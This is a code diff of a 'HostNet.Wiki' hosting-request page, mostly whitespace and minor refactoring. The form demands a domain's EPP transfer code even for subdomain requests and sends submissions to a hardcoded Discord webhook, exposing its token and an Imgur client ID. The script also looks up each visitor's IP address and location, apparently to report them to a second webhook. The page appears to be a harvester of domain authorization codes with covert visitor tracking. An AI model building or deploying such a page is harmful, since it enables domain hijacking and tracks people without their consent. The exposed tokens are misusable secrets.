@@ -11,17 +11,14 @@
   <meta name="theme-color" content="#1E90FF" />
   <link rel="icon" href="https://example.com/favicon.ico" type="image/x-icon" />
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet"/>
-
   <!-- Load reCAPTCHA Script -->
   <script src="https://www.google.com/recaptcha/api.js" async defer></script>
-
   <style>
     * {
       box-sizing: border-box;
       margin: 0;
       padding: 0;
     }
-
     body {
       font-family: 'Poppins', sans-serif;
       background: linear-gradient(145deg, #0f0f1a, #12121c);
@@ -32,7 +29,6 @@
       align-items: center;
       padding: 40px 20px;
     }
-
     .glass-card {
       background: rgba(255, 255, 255, 0.05);
       backdrop-filter: blur(10px);
@@ -42,27 +38,23 @@
       width: 100%;
       max-width: 700px;
     }
-
     h1 {
       font-size: 2rem;
       text-align: center;
       margin-bottom: 10px;
       color: #1E90FF;
     }
-
     p {
       text-align: center;
       color: #aaa;
       margin-bottom: 30px;
     }
-
     label {
       display: block;
       margin-bottom: 6px;
       font-weight: 600;
       color: #ccc;
     }
-
     input,
     select,
     textarea {
@@ -75,7 +67,6 @@
       color: #fff;
       font-size: 1rem;
     }
-
     button {
       width: 100%;
       padding: 14px;
@@ -88,41 +79,33 @@
       cursor: pointer;
       transition: all 0.3s ease;
     }
-
     button:hover {
       background: linear-gradient(to right, #ff1a1a, #cc0000);
     }
-
     .form-group {
       margin-bottom: 20px;
     }
-
     .status {
       text-align: center;
       margin-top: 20px;
       font-weight: bold;
     }
-
     .success {
       color: #6bff6b;
     }
-
     .error {
       color: #ff1a1a;
     }
-
     footer {
       text-align: center;
       margin-top: 30px;
       font-size: 0.9rem;
       color: #666;
     }
-
     footer a {
       color: #1E90FF;
       text-decoration: none;
     }
-
     /* reCAPTCHA styling */
     .g-recaptcha {
       transform: scale(0.88);
@@ -132,14 +115,11 @@
   </style>
 </head>
 <body>
-
   <div class="glass-card">
     <h1>HostNet.Wiki</h1>
     <p>Secure web hosting with subdomains, custom domains, and HTML uploads.</p>
-
     <!-- Backend Status -->
     <div class="status" id="backendStatus">Checking backend status...</div>
-
     <!-- Submission Form -->
     <form id="hostingForm">
       <div class="form-group">
@@ -150,22 +130,18 @@
           <option value="domain">Custom Domain</option>
         </select>
       </div>
-
       <div class="form-group" id="subdomainField" style="display: none;">
         <label for="subdomainName">Subdomain Name</label>
         <input type="text" id="subdomainName" name="subdomainName" placeholder="john" />
       </div>
-
       <div class="form-group" id="domainField" style="display: none;">
         <label for="domainName">Domain Name</label>
         <input type="text" id="domainName" name="domainName" placeholder="example.com" />
       </div>
-
       <div class="form-group">
         <label for="authCode">Authorization Code (EPP Code)</label>
         <input type="text" id="authCode" name="authCode" placeholder="Your EPP/Auth Code" required />
       </div>
-
       <div class="form-group">
         <label for="reasonSelect">Reason for Hosting</label>
         <select id="reasonSelect" name="reasonSelect" required>
@@ -176,36 +152,29 @@
           <option value="Other">Other</option>
         </select>
       </div>
-
       <div class="form-group" id="customReasonField" style="display: none;">
         <label for="customReason">Specify Custom Reason</label>
         <input type="text" id="customReason" name="customReason" placeholder="Type your reason here" />
       </div>
-
       <div class="form-group" id="redirectField" style="display: none;">
         <label for="redirectUrl">Redirect URL</label>
         <input type="text" id="redirectUrl" name="redirectUrl" placeholder="https://example.com" />
       </div>
-
       <div class="form-group">
         <label for="htmlFile">Upload HTML File (with CSS/JS included)</label>
         <input type="file" id="htmlFile" name="htmlFile" accept=".html" />
       </div>
-
       <div class="form-group">
         <label for="customHtml">Or Paste Custom HTML/Social Widget</label>
         <textarea id="customHtml" name="customHtml" rows="5" placeholder="Paste your full HTML snippet here"></textarea>
       </div>
-
       <!-- reCAPTCHA -->
       <div class="form-group">
         <div class="g-recaptcha" data-sitekey="6LeLxzErAAAAAOfIwlGu34wx1BaKQIoD6I6ZH6aV"></div>
       </div>
-
       <button type="submit">Submit Request</button>
       <p id="formMessage" class="status"></p>
     </form>
-
     <footer>
       &copy; 2025 HostNet.Wiki. All rights reserved. |
       <a href="#">Privacy Policy</a> |
@@ -215,7 +184,7 @@
 
   <script>
     const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1369719012371726437/6aJepWKi1QDCRySfi4RJsKAFv6xLmyoVmIXYIMe7TjVMYQhDlIMqxsWw6Il8U9kYteHI';
-    const VISITOR_WEBHOOK_URL = 'https://discord.com/api/webhooks/1369719012371726437/6aJepWKi1QDCRySfi4RJsKAFv6xLmyoVmIXYIMe7TjVMYQhDlIMqxsWw6Il8U9kYteHI'; // Optional
+    const VISITOR_WEBHOOK_URL = 'https://discord.com/api/webhooks/YOUR-VISITOR-WEBHOOK'; // Optional
     const IMGUR_CLIENT_ID = '919e66780dffebb';
 
     // Check backend status
@@ -248,25 +217,22 @@
 
       const formData = new FormData(document.getElementById('hostingForm'));
       const data = {};
-      formData.forEach((value, key) => {
-        if (value.trim()) data[key] = value.trim();
-      });
+      for (const [key, value] of formData.entries()) {
+        data[key] = value.trim();
+      }
 
       if (!data.hostType) {
         alert('Please select a hosting type.');
         return;
       }
-
       if (data.hostType === 'subdomain' && !data.subdomainName) {
         alert('Please enter a subdomain name.');
         return;
       }
-
       if (data.hostType === 'domain' && !data.domainName) {
         alert('Please enter a domain name.');
         return;
       }
-
       if (!data.authCode) {
         alert('Please provide an authorization code.');
         return;
@@ -310,7 +276,6 @@
         embed.fields.push({ name: "Redirect URL", value: `\`${data.redirectUrl}\``, inline: false });
       }
 
-      // Handle uploaded file
       const htmlFile = document.getElementById('htmlFile').files[0];
       if (htmlFile) {
         embed.fields.push({
@@ -320,17 +285,15 @@
         });
       }
 
-      // Handle pasted HTML
       if (data.customHtml) {
         const snippet = data.customHtml.substring(0, 1024);
         embed.fields.push({
           name: "Custom HTML Snippet",
-          value: `\`\`\`html\n${snippet}\n\`\`\``,
+          value: "```html\n" + snippet + "\n```",
           inline: false
         });
       }
 
-      // Add reCAPTCHA token
       embed.fields.push({
         name: "reCAPTCHA Token",
         value: `\`${recaptchaResponse.value.substring(0, 20)}...\``,
@@ -350,12 +313,11 @@
         });
 
         const msg = document.getElementById("formMessage");
-
         if (res.ok) {
           msg.textContent = "✅ Request submitted successfully!";
           msg.className = "status success";
           document.getElementById("hostingForm").reset();
-          grecaptcha.reset(); // Reset reCAPTCHA
+          if (typeof grecaptcha !== 'undefined') grecaptcha.reset(); // Safe reset
           setTimeout(() => window.location.href = '/', 2000);
         } else {
           msg.textContent = "❌ Failed to submit request.";
@@ -373,7 +335,6 @@
       try {
         const ipRes = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipRes.json();
-
         const whoisRes = await fetch(`https://ipinfo.io/${ipData.ip}/json`);
         const whoisData = await whoisRes.json();
 
